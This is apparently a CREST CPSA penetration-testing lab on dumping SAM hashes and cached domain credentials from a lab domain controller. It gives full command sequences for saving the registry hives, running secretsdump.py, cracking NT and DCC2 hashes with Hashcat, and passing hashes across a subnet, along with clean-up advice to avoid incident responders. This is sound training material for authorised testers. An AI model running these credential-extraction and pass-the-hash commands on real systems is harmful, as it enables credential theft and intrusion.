Lab E5-B: SAM Dump and Cached Domain Credentials

Module E Post-Exploitation CREST CPSA CPSA Ref: E5 Difficulty: Intermediate Estimated time: 55 min
Windows Attack Chain - Where You Are Now
E0 Pre-flight→ E1-A SMB Enum→ E2-A Credential Access→ E3-A PrivEsc→ E3-B ACLs→ E4-A AD Enum→ E4-B Password Spray→ E5-A Kerberos→ E5-B SAM Dump→ E6-A SQL→ E7-A Patch Assessment

You have SYSTEM on the DC from E3-A and a domain account from E5-A Kerberos attacks. This is the credential harvesting phase - dump the SAM database (local accounts), extract cached domain credentials (DCC2) from the registry, and crack them offline. These hashes may unlock accounts not reached by Kerberoasting and provide the cleartext passwords needed for lateral movement.

Engagement Scenario

With SYSTEM on SYNTEX-DC01, your objective is to extract every password hash stored locally on the DC. The SAM database holds local account NT hashes. The registry holds up to 10 cached domain logon hashes (DCC2 format) for accounts that have logged on to this machine. Additionally, you will use secretsdump.py remotely - the same technique you would use from Kali if you had domain admin credentials but no interactive shell.

Learning Objectives

  • Understand the difference between SAM hashes (NT), cached credentials (DCC2), and NTDS.dit hashes
  • Use secretsdump.py to remotely extract SAM hashes with domain admin credentials
  • Extract cached domain credentials from the registry with reg save
  • Crack NT hashes (mode 1000) and DCC2 hashes (mode 2100) with Hashcat
  • Identify when to use Pass-the-Hash vs when cracking is required

Hash Types - Know Before You Crack

Theory

Before dumping anything, understand what you are extracting and what you can do with each hash type:

NT Hash (NTLM)

Hashcat: -m 1000

Stored in SAM (local accounts) and NTDS.dit (domain accounts). Can be passed directly with Evil-WinRM -H or CME -H without cracking. Format: 32 hex characters.

DCC2 / msCachev2

Hashcat: -m 2100

Cached domain credentials stored in registry at HKLM\SECURITY\Cache. Cannot be passed - must be cracked. Much slower to crack than NT. Format: $DCC2$10240#username#hash.

NetNTLMv2

Hashcat: -m 5600

Challenge-response hash captured by Responder (E2-A). Cannot be passed - must be cracked or relayed. Format: long string with username, challenge and response.

Kerberos TGS ($krb5tgs)

Hashcat: -m 13100

Kerberoasting output (E5-A). Cannot be passed - must be cracked. Encrypted with the service account's password hash. Format: $krb5tgs$23$...

★
CREST CPSA Exam Point: This table is exam-critical. You must know which hash types can be passed and which must be cracked. NT hashes (from SAM/NTDS) are passable. DCC2, NetNTLMv2, and Kerberos TGS hashes cannot be passed - they must be cracked with Hashcat using the correct mode number. Learn all four mode numbers.

Remote SAM Dump with secretsdump.py

Impacket / Remote

If you have domain admin credentials (from Kerberoasting or password spray), you can dump SAM remotely from Kali without an interactive shell. This is a stealthy approach as it avoids dropping files on the target:

# Remote SAM dump using secretsdump.py with domain admin creds
# Replace svc-sql with whichever DA-equivalent account you cracked in E5-A
secretsdump.py syntex.local/svc-sql:Password123@<DC01-IP>

Manual Registry Extraction for Cached Creds

reg save / SYSTEM shell

If you have a SYSTEM shell but cannot use secretsdump remotely, extract the required registry hives manually and pull them to Kali for offline processing:

# On SYNTEX-DC01 (SYSTEM shell) - save the three required hives
# SAM hive - contains local user NT hashes
reg save HKLM\SAM C:\Windows\Temp\sam.hive
# SYSTEM hive - contains the boot key needed to decrypt SAM
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
# SECURITY hive - contains cached domain credentials (DCC2)
reg save HKLM\SECURITY C:\Windows\Temp\security.hive

The operation completed successfully.  (x3)

Transfer the hives to Kali and process them with secretsdump.py in offline mode:

# On Kali: retrieve the three hive files
# (via Evil-WinRM download or SMB share)
evil-winrm -i <DC01-IP> -u hr.admin -p Password1
# Evil-WinRM prompt:
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
download C:\Windows\Temp\security.hive

# On Kali: process offline with secretsdump
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

⚠
Clean Up: Delete the hive files from C:\Windows\Temp after transferring them. Leaving registry hive dumps on the target is a significant operational security failure - they contain sensitive credential data and are easily found by incident responders. Document that you deleted them in your engagement notes.

Cracking NT Hashes and DCC2 with Hashcat

Hashcat

NT hashes (mode 1000) crack very fast - many will crack instantly against rockyou.txt. DCC2 hashes (mode 2100) are significantly slower due to 10,240 PBKDF2 iterations:

# Crack NT hashes - mode 1000 - very fast
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt --force

64f12cddaa88057e06a81b54e73b949b:Password1
31d6cfe0d16ae931b73c59d7e0c089c0:           <-- empty password (disabled account)
e4109f8977e9e7a5be9c87ae07c9e520:Syntex2024!

# Crack DCC2 hashes - mode 2100 - MUCH slower
# Save DCC2 hashes to a file first
cat dcc2_hashes.txt
$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b
$DCC2$10240#mjones#7c8e1a2b3d4f5e6a7b8c9d0e1f2a3b4c

hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt --force

$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b:Welcome1
# DCC2 cracking is slow - use rules or targeted wordlists if rockyou stalls

# Add rules to expand wordlist coverage
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Pass NT hashes directly without cracking where possible - this avoids wasting time on complex passwords:

# Pass-the-Hash with Evil-WinRM (-H flag for NT hash)
evil-winrm -i <DC01-IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Pass-the-Hash with CrackMapExec
crackmapexec smb <DC01-IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

SMB    <DC01-IP>  445  SYNTEX-DC01  [+] syntex.local\Administrator:64f12cddaa88... (Pwn3d!)

# Spray the NT hash across the subnet to find other machines where this account is admin
crackmapexec smb 192.168.1.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Note: DCC2 hashes CANNOT be passed - they must be cracked first
★
CREST CPSA Exam Point: DCC2 (Domain Cached Credentials v2) are stored when a domain user logs onto a machine that cannot reach a DC, so Windows can still authenticate them locally. The default is 10 cached logons. They cannot be used for network authentication - they only allow local interactive logon when the DC is unreachable. This is different from NT hashes which can be passed over the network.

Knowledge Check

Q1. You extract a DCC2 hash from the registry. What can you do with it directly?

A. Pass it with Evil-WinRM using the -H flag to authenticate to the DC
B. Use it with Mimikatz sekurlsa::pth to create a new token
C. Crack it offline with Hashcat mode 2100 to recover the plaintext password
D. Use it with secretsdump.py to dump NTDS.dit remotely

Q2. Why does extracting cached credentials require both the SAM, SYSTEM, and SECURITY hives?

The SYSTEM hive contains the boot key (syskey), which is used to encrypt the SAM and SECURITY hives. Without the boot key from SYSTEM, the hashes in SAM and SECURITY are encrypted and unreadable. secretsdump.py (and Mimikatz) decrypt the hashes using: boot key from SYSTEM, then hashed boot key from SAM, then the actual hashes. All three hives are always required for offline processing.

Q3. What Hashcat mode cracks NT hashes from the SAM database?

A. 5600 (NetNTLMv2)
B. 13100 (Kerberoasting)
C. 2100 (DCC2)
D. 1000 (NTLM/NT)

Key Takeaways

  • NT hashes (SAM/NTDS) can be passed directly - no cracking required for lateral movement
  • DCC2 hashes cannot be passed over the network - they must be cracked with Hashcat mode 2100
  • secretsdump.py works both remotely (with creds) and offline (with hive files)
  • Always extract SAM, SYSTEM, and SECURITY together - secretsdump needs all three
  • Delete hive files from the target immediately after transfer - they are high-value artefacts
  • DCC2 cracking is slow - prioritise NT hash passing and targeted wordlists over brute force
